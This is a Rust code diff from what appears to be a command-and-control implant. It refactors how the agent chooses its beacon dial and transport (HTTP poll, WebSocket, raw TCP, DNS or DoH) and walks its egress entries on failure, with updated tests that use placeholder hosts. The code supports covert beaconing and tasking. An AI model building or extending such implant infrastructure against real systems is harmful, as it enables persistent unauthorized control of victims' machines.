@@ -57,16 +57,13 @@ pub fn build_agent(url: &str, profile: &Profile, timeout_seconds: f64) -> ureq::
     builder.build()
 }
 
-/// One contact carriage: a way to hold a contact against a front. The run
-/// loop walks its egress entries and hands each to the carriage the bake's
-/// mode names for the entry's URL shape; the carriage borrows the session
-/// (never owns it), so cross-carriage state -- the nonce floor, the ledger,
-/// the cadence -- survives every switch and reconnect.
+/// One contact carriage: a way to hold a contact against one walked dial.
+/// The run loop builds the carriage for the egress entry the walk points at
+/// -- the entry's own shape and the bake's mode name the client -- and
+/// rebuilds it when a failed contact walks to the next entry. The carriage
+/// borrows the session (never owns it), so cross-carriage state -- the nonce
+/// floor, the ledger, the cadence -- survives every switch and reconnect.
 pub trait Contact {
-    /// The run loop's selector: whether this carriage serves a beacon URL
-    /// under the baked mode.
-    fn serves(&self, url: &str, mode: &str) -> bool;
-
     /// One contact attempt. `Ok(Attempt::Crossed)` means the attempt's
     /// response was processed whole; `Err(ContactError::Refused)` is a
     /// permanent answer; everything else is a dropped attempt the run loop
@@ -116,24 +113,19 @@ pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], ack
     }
 }
 
-/// The URL this bake's carriages dial: the beacon route hanging off the
-/// enroll front the profile names. The baked front carries scheme and
-/// authority (the dial shape the server bakes); the envelope route hangs off
-/// it, so a baked front without its own route gains the beacon path. The
-/// socket family's dial carries no route at all -- the raw address the
-/// carriage connects to, normalized to its bare authority.
-pub fn dialed_beacon_url(profile: &Profile) -> String {
-    // The DNS family's dial data is the zone itself, and the route
-    // derivation would bury it under the beacon path -- the zone is the
-    // dial's own data, not a route. So a dns-schemed enroll front is the
-    // dial verbatim, before the web families' route derivation touches any
-    // path at all.
-    if let Some((_, _, zone)) = dns::parse_front(profile.enroll_url.trim_end_matches('/')) {
+/// The contact dial off one enroll front: the URL the run loop's egress
+/// walk carries for that front. The web families derive the fixed envelope
+/// route off the front's scheme and authority; the non-web families carry
+/// their own dial data in the URL -- the DNS family's zone above all, which
+/// the route derivation would bury, so a dns-schemed front is the dial
+/// verbatim, and the socket family's dial is its bare authority.
+pub fn contact_dial(enroll_url: &str) -> String {
+    if let Some((_, _, zone)) = dns::parse_front(enroll_url.trim_end_matches('/')) {
         if !zone.is_empty() {
-            return profile.enroll_url.trim_end_matches('/').to_string();
+            return enroll_url.trim_end_matches('/').to_string();
         }
     }
-    normalize_fronts(beacon_url(&profile.enroll_url))
+    normalize_fronts(beacon_url(enroll_url))
 }
 
 /// The non-web families' front shapes: the socket's dial is the bare
@@ -165,26 +157,26 @@ fn normalize_fronts(front: String) -> String {
     front
 }
 
-/// The carriage the bake's front and mode name: the socket family's dial
-/// picks the raw-TCP client (the mode choosing its poll or live shape),
-/// otherwise poll is the default and stream the WebSocket client.
-pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
-    let dial = dialed_beacon_url(profile);
+/// The carriage one walked dial names: the socket family's dial picks the
+/// raw-TCP client (the mode choosing its poll or live shape), the DNS
+/// family's the datagram exchange, and otherwise the baked mode picks the
+/// web client -- poll's POST cycle or stream's WebSocket.
+pub fn carriage_for(dial: &str, profile: &Profile) -> Box<dyn Contact> {
     if dial.starts_with("tcp://") {
-        return Box::new(rawtcp::RawTcp::new(profile));
+        return Box::new(rawtcp::RawTcp::new(dial, profile));
     }
     if dial.starts_with("dns://") || dial.starts_with("doh://") {
-        return match dns::Dns::new(profile) {
+        return match dns::Dns::new(dial, profile) {
             Ok(carriage) => Box::new(carriage),
             // The dial is DNS-shaped by construction here, so this is a
             // bind failure: the run loop's walk treats it as a dropped
             // cycle and retries on the cadence.
-            Err(_) => Box::new(http::Poll::new(profile)),
+            Err(_) => Box::new(http::Poll::new(dial, profile)),
         };
     }
     match profile.mode.as_str() {
-        "stream" => Box::new(stream::Stream::new(profile)),
-        _ => Box::new(http::Poll::new(profile)),
+        "stream" => Box::new(stream::Stream::new(dial, profile)),
+        _ => Box::new(http::Poll::new(dial, profile)),
     }
 }
 
@@ -240,24 +232,20 @@ mod tests {
     }
 
     #[test]
-    fn dialed_fronts_carry_the_non_web_families_dial_data() {
-        // The DNS zone is dial data, not a route: the dns-schemed enroll
-        // front is the dial verbatim, and the web derivation never touches
-        // it.
-        let mut dns = profile();
-        dns.enroll_url = "dns://resolver.example/zone.example".into();
+    fn contact_dials_carry_the_non_web_families_dial_data() {
+        // The DNS zone is dial data, not a route: the dns-schemed front is
+        // the dial verbatim, and the web derivation never touches it.
         assert_eq!(
-            dialed_beacon_url(&dns),
+            contact_dial("dns://resolver.example/zone.example"),
             "dns://resolver.example/zone.example"
         );
-        let mut tcp = profile();
-        tcp.enroll_url = "tcp://10.0.0.9:8443/anything".into();
-        assert_eq!(dialed_beacon_url(&tcp), "tcp://10.0.0.9:8443");
-        // The web family: the route derived off the front.
-        let mut web = profile();
-        web.enroll_url = "https://front.example/enroll".into();
         assert_eq!(
-            dialed_beacon_url(&web),
+            contact_dial("tcp://10.0.0.9:8443/anything"),
+            "tcp://10.0.0.9:8443"
+        );
+        // The web family: the route derived off the front.
+        assert_eq!(
+            contact_dial("https://front.example/enroll"),
             "https://front.example/implants/beacon"
         );
     }
